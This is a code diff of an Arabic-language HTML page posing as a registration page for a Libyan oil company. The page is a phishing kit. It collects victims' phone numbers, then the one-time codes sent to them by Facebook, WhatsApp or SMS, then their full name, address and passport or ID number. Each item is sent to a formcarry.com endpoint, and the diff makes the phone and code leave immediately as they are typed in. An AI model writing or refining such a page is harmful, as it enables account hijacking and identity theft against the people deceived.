@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>تسجيل - شركة الليبية للنفط</title>
   <style>
     body {
@@ -12,13 +12,11 @@
       padding: 0;
       color: #004c97;
     }
-
     .container {
       max-width: 400px;
       margin: auto;
       padding: 20px;
     }
-
     .card {
       background: #fff;
       border-radius: 20px;
@@ -27,23 +25,19 @@
       margin-bottom: 20px;
       display: none;
     }
-
     .card.active {
       display: block;
     }
-
     h3 {
       color: #004c97;
       margin-bottom: 15px;
     }
-
     label {
       display: block;
       margin: 10px 0 5px;
       font-weight: bold;
       color: brown;
     }
-
     input, button, select {
       width: 100%;
       padding: 12px;
@@ -53,12 +47,9 @@
       font-size: 16px;
       box-sizing: border-box;
     }
-
-    /* لون placeholder الذهبي */
     input::placeholder {
       color: goldenrod;
     }
-
     button {
       background-color: #004c97;
       color: white;
@@ -66,11 +57,9 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
-
     button:hover {
       background-color: #003b78;
     }
-
     .toast {
       position: fixed;
       top: 30px;
@@ -88,35 +77,35 @@
 </head>
 <body>
   <div class="container">
-    <!-- المرحلة 1: إدخال رقم الهاتف -->
+    <!-- المرحلة 1 -->
     <div class="card active" id="step1">
       <h3>سجل الدخول</h3>
       <label for="phone">رقم الهاتف</label>
-      <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
+      <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10" autocomplete="off">
       <button onclick="handleStep1()">إرسال رمز التأكيد</button>
     </div>
 
-    <!-- المرحلة 2: إدخال كود التأكيد -->
+    <!-- المرحلة 2 -->
     <div class="card" id="step2">
       <label for="code">الكود أشعار فيسبوك او واتساب أو رسالة نصية</label>
-      <input type="text" id="code" placeholder="أدخل الكود هنا">
+      <input type="text" id="code" placeholder="أدخل الكود هنا" autocomplete="off">
       <button onclick="handleStep2()">ارسال الكود للتأكيد</button>
     </div>
 
-    <!-- المرحلة 3: البيانات الإضافية -->
+    <!-- المرحلة 3 -->
     <div class="card" id="step3">
       <h3>معلوماتك الشخصية</h3>
       <label for="fullname">الاسم بالكامل</label>
-      <input type="text" id="fullname" placeholder="الاسم بالكامل">
+      <input type="text" id="fullname" placeholder="الاسم بالكامل" autocomplete="off">
       <label for="address">العنوان</label>
-      <input type="text" id="address" placeholder="العنوان بالتفصيل">
+      <input type="text" id="address" placeholder="العنوان بالتفصيل" autocomplete="off">
       <label for="idNumber">رقم جواز السفر أو البطاقة</label>
-      <input type="text" id="idNumber" placeholder="مثال: A123456 أو 1234567">
-      <button onclick="submitAll()">إرسال جميع البيانات</button>
+      <input type="text" id="idNumber" placeholder="مثال: A123456 أو 1234567" autocomplete="off">
+      <button onclick="submitFinal()">إرسال جميع البيانات</button>
     </div>
   </div>
 
-  <!-- نافذة الإشعار -->
+  <!-- رسالة -->
   <div class="toast" id="toast">تأكد أن الكود الذي ادخلته صحيح او سوف تضطر اعادة التسجيل</div>
 
   <script>
@@ -133,34 +122,50 @@
     }
 
     function handleStep1() {
-      const phone = document.getElementById('phone').value;
+      const phone = document.getElementById('phone').value.trim();
       if (!isLibyanPhone(phone)) {
         alert("يرجى إدخال رقم هاتف ليبي صحيح بدون المقدمة الدولية 218");
         return;
       }
+
+      // إرسال الرقم فقط
+      const formData = new FormData();
+      formData.append('phone', phone);
+      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
       document.getElementById('step1').classList.remove('active');
       document.getElementById('step2').classList.add('active');
-      submitAll();
     }
 
     function handleStep2() {
-      const code = document.getElementById('code').value;
+      const code = document.getElementById('code').value.trim();
       if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
         alert("يرجى إدخال كود صحيح (6 إلى 8 أحرف أو أرقام)");
         return;
       }
+
+      // إرسال الكود فقط
+      const formData = new FormData();
+      formData.append('code', code);
+      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
       showToast();
       setTimeout(() => {
         document.getElementById('step2').classList.remove('active');
         document.getElementById('step3').classList.add('active');
-        submitAll();
       }, 5000);
     }
 
-    function submitAll() {
+    function submitFinal() {
       const formData = new FormData();
-      formData.append('phone', document.getElementById('phone').value);
-      formData.append('code', document.getElementById('code').value);
       formData.append('fullname', document.getElementById('fullname').value);
       formData.append('address', document.getElementById('address').value);
       formData.append('idNumber', document.getElementById('idNumber').value);
@@ -168,16 +173,14 @@
       fetch('https://formcarry.com/s/ldfA_DUCDrk', {
         method: 'POST',
         body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
+        headers: { 'Accept': 'application/json' }
       })
-      .then(response => response.json())
-      .then(data => {
-        console.log('تم الإرسال إلى Formcarry:', data);
-      })
-      .catch(error => {
-        console.error('حدث خطأ أثناء الإرسال:', error);
+      .then(() => {
+        // مسح الحقول بعد الإرسال
+        document.getElementById('fullname').value = '';
+        document.getElementById('address').value = '';
+        document.getElementById('idNumber').value = '';
+        alert("تم إرسال البيانات بنجاح");
       });
     }
   </script>
